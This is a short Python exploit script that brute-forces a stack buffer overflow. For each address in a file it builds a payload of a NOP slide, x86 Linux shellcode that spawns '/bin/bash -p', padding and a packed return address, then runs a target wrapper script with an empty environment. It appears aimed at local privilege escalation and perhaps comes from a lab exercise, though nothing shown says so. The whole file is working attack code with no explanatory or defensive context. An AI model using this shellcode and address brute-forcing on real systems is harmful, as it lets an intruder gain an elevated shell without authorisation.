#!/usr/bin/python
import sys
import struct
import subprocess

with open("testaddresses", "r") as f:
        for line in f.readlines():
                slide = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                payload = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
                padding = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
                address = struct.pack("<I", int(line.strip(),16))

                arg = slide+payload+padding+address
                pretty_addr = "0x%X" % int(line.strip(),16)
                with open("t", "w") as t:
                        t.write(arg)
                try:
                        subprocess.call("echo " + pretty_addr + "; env - /tmp/b.sh", shell=True)
                except:
                        pass
